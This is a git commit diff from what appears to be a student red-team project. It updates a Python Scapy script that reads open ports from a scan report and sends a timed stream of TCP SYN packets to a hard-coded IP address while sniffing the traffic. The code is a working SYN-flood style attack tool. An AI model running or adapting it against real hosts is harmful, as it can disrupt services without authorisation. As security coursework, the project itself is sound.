d2ff433381722cd799d6ae433e70645a5c2e8e6c
Juan Viquez <jviquez027@gmail.com>
2025-08-20 16:50:31 -0600

    Update packet_attack.py

--- proyecto_ciberseguridad/red_team/packet_attack.py
+++ proyecto_ciberseguridad/red_team/packet_attack.py
@@ -1,16 +1,15 @@
 from datetime import datetime
-import os
-import re
 from scapy.all import IP, TCP, Raw, sniff, send, RandInt
 from threading import Thread
+
+import os
+import re
+import time
 
 
 HOST = "74.179.81.132"
 ruta_actual = os.getcwd()
-print(ruta_actual)
 ruta_reporte_scan = os.path.join(ruta_actual, "ultimo_reporte_scan.txt")
-print(ruta_reporte_scan)
-
 
 def validar_puertos_abiertos(ruta_reporte):
     """
@@ -20,57 +19,63 @@ def validar_puertos_abiertos(ruta_reporte):
     """
     puertos_abiertos = []
 
-    # Lee el archivo, y extrae unicamente el numero de puerto
-    with open(ruta_reporte, "r", encoding="utf-8") as f:
-        for l in f:
-            linea = l.strip()
-            m = re.search(r"Puerto\s+(\d+):\s+open", linea, re.IGNORECASE)
-            if m:
-                # Agrega cada numero a la lista de puertos
-                puertos_abiertos.append(int(m.group(1)))
+    try:
+        # Lee el archivo, y extrae unicamente el numero de puerto
+        with open(ruta_reporte, "r", encoding="utf-8") as f:
+            for l in f:
+                linea = l.strip()
+                m = re.search(r"Puerto\s+(\d+):\s+open", linea, re.IGNORECASE)
+                if m:
+                    # Agrega cada numero a la lista de puertos
+                    puertos_abiertos.append(int(m.group(1)))
+    except FileNotFoundError:
+        print(f"[!] Archivo {ruta_reporte} no encontrado.")
+    except Exception as e:
+        print(f"[!] Error leyendo {ruta_reporte}: {e}")
 
     return puertos_abiertos
 
 
-def procesar_paquete(paquete, eventos):
+def procesar_paquete(paquete, trafico_sniffer):
     """
     Procesa un paquete capturado como un dict y lo agregra a una lista de eventos.
     Arg:
-        paquete: 
-        eventos: Lista de eventos
+        paquete: Paquete capturado por el Sniffer
+        trafico_sniffer: Lista de trafico capturado en el sniffer
     """
-    datos_paquete = { # Dict con los datos del paquete
-        "len": len(paquete),
-        "src": paquete[IP].src,
-        "dst": paquete[IP].dst,
-        "ttl": paquete[IP].ttl,
-        "sport": paquete[TCP].sport,
-        "dport": paquete[TCP].dport,
-        "flags": str(paquete[TCP].flags),
-        "seq": paquete[TCP].seq,
-        "chksum": paquete[TCP].chksum,
-    }
-    if paquete.haslayer(Raw):
-        try:
-            datos_paquete["raw"] = paquete[Raw].load.decode(errors="ignore")
-        except Exception:
-            datos_paquete["raw"] = None
-    eventos.append(datos_paquete)
+    # Almacena todos los datos que se capturan en el sniffer
+    try:
+        datos_paquete = {
+            "summary": paquete.summary(),
+            "datos": paquete.show(dump=True)
+        }
+
+        # Agrega el paquete a la lista de eventos
+        trafico_sniffer.append(datos_paquete)
+
+    except Exception as e:
+        print(f"[!] Error procesando el paquete: {e}")
 
 
-def sniffer_de_trafico(eventos):
+def sniffer_de_trafico(trafico_sniffer):
     """
-    Captura de tráfico entre equipo local y el host
+    Captura de tráfico entre equipo local y el host durante XX segundos
+        variable timeout = XX segundos
     Arg:
-        eventos: Lista donde se almacenan los eventos capturados
+        trafico_sniffer: Lista donde se almacena el trafico capturado
     """
     filtro_bpf = f"host {HOST}"
-    sniff(
-        filter=filtro_bpf,
-        iface="wlan0",
-        prn=lambda paquete: procesar_paquete(paquete, eventos),
-        timeout=10
-    )
+
+    try:
+        sniff(
+            filter=filtro_bpf,
+            iface="wlan0",
+            prn=lambda paquete: procesar_paquete(paquete, trafico_sniffer),
+            timeout=20
+        )
+
+    except Exception as e:
+        print(f"[!] Error en sniffer: {e}")
 
 
 def envio_TCP(puertos_dest):
@@ -79,34 +84,46 @@ def envio_TCP(puertos_dest):
     Arg:
         puertos_dest: Lista de puertos abiertos, obtenida del reporte de scanner.py
     Retorna:
-        Reporte de paquetes enviados
+        Reporte de paquetes enviados 
     """
 
-    cant_paquetes = 10
-    ip = IP(dst = HOST)
+    # Dict = cada puerto con una lista de trafico enviado
     reporte_puertos = {p: [] for p in puertos_dest}
+    ip = IP(dst = HOST)
+    tiempo_envio = 15
 
-    for p in range(cant_paquetes):
+    inicio = time.time()
+    cant_paquetes = 0
+
+    while time.time() - inicio < tiempo_envio:
+        cant_paquetes += 1
+        # Envia un paquete a cada puerto abierto
         for puerto in puertos_dest:
-            tcp = TCP(dport=puerto, seq=RandInt(),  flags="S")
-            packet = ip/tcp
+            try:
+                tcp = TCP(dport=puerto, seq=RandInt(),  flags="S")
+                packet = ip/tcp # Arma el paquete a enviar
+                packet = packet.__class__(bytes(packet))
 
-            packet = packet.__class__(bytes(packet))
-            send(packet)
+                try:
+                    send(packet, verbose=0) # Envía el paquete
+                except Exception as e:
+                    print(f"[!] Error enviando paquete al puerto {puerto}: {e}")
 
-            print(f"Paquete TCP-SYN seq: {packet[TCP].seq} enviado a {HOST}:{puerto}\n")
+                print(f"Enviando paquete SYN a {HOST}, {puerto}/tcp\n")
 
-            reporte_puertos[puerto].append({
-                "numero" : p+1,
-                "tamaño" : len(packet),
-                "IP_O" : packet[IP].src,
-                "IP_D" : packet[IP].dst,
-                "TTL" : packet[IP].ttl,
-                "Puerto_O" : packet[TCP].sport,
-                "Puerto_D" : packet[TCP].dport,
-                "Flag" : packet[TCP].flags,
-                "Seq" : packet[TCP].seq,
-                "CheckSum" : hex(packet[TCP].chksum)})
+                reporte_puertos[puerto].append({
+                    "numero" : cant_paquetes,
+                    "tamaño" : len(packet),
+                    "ip_o" : packet[IP].src,
+                    "ip_d" : packet[IP].dst,
+                    "puerto_o" : packet[TCP].dport,
+                    "flag" : packet[TCP].flags,
+                    "seq" : packet[TCP].seq,
+                    "time" : datetime.now()
+                    })
+            
+            except Exception as e:
+                print(f"[!] Error armando el paquete para el puerto {puerto}: {e}")
 
     return reporte_puertos
 
@@ -118,20 +135,24 @@ def ejecutar_packet_attack(puertos):
         puertos: Lista de puertos abiertos
     Retorna:
         reporte_syn = Datos recolectados al ejecutar el envío de trafico SYN
-        eventos = Lista de eventos encontrados
+        trafico_generado = Lista de eventos encontrados
     """
     
-    eventos = []
+    trafico_generado = []
 
-    # Prepara la funcion de sniffer para ejecutarse como daemon
-    hilo = Thread(target=sniffer_de_trafico, args=(eventos,), daemon=True)
-    hilo.start() # Inicia el hilo (daemon)
+    try:
+        # Prepara la funcion de sniffer para ejecutarse como daemon
+        hilo = Thread(target=sniffer_de_trafico, args=(trafico_generado,), daemon=True)
+        hilo.start() # Inicia el hilo (daemon)
 
-    reporte_syn = envio_TCP(puertos) # Inicia el envio de trafico
+        reporte_syn = envio_TCP(puertos) # Inicia el envio de trafico
 
-    hilo.join()  # espera a que el sniffer termine por timeout
+        hilo.join()  # espera a que el sniffer termine por timeout
 
-    return reporte_syn, eventos
+        return reporte_syn, trafico_generado
+    
+    except Exception as e:
+        print(f"[!] Error en ejecutando packet_attack: {e}")
 
 
 def obtener_fecha_hora():
@@ -161,16 +182,17 @@ if __name__ == "__main__":
     for puerto, resp in reporte_syn.items():
         print(f"REPORTE DE PUERTO: {puerto}")
         for info in resp:
-            print(f"Paquete #{info['numero']}: size={info['tamaño']} sport={info['Puerto_O']} seq={info['Seq']} chksum={info['CheckSum']}")
-#            print(f"Paquete #{info['numero']}:")
-#            print(f"  Tamaño        : {info['tamaño']} bytes")
-#            print(f"  IP Origen     : {info['IP_O']}")
-#            print(f"  IP Destino    : {info['IP_D']}")
-#            print(f"  TTL           : {info['TTL']}")
-#            print(f"  Puerto Origen : {info['Puerto_O']}")
-#            print(f"  Puerto Destino: {info['Puerto_D']}")
-#            print(f"  Flags         : {info['Flag']}")
-#            print(f"  # Secuencia   : {info['Seq']}")
-#            print(f"  Check Sum TCP : {info['CheckSum']}")
-            print("-" * 40)
+            print(f"Paquete #{info['numero']}",
+                  f"| size={info['tamaño']}",
+                  f"| hora={info['time']}",
+                  f"| ip_origen={info['ip_o']}",
+                  f"| ip_destino={info['ip_d']}",
+                  f"| puerto_origen={info['puerto_o']}",
+                  f"| flag={info['flag']}",
+                  f"| seq={info['seq']}")
+        print("-" * 40)
 
+    print("\n==== EVENTOS CAPTURADOS POR EL SNIFFER ====")
+    for ev in eventos_sniff:
+        print(ev["summary"])
+    print("-" * 40)
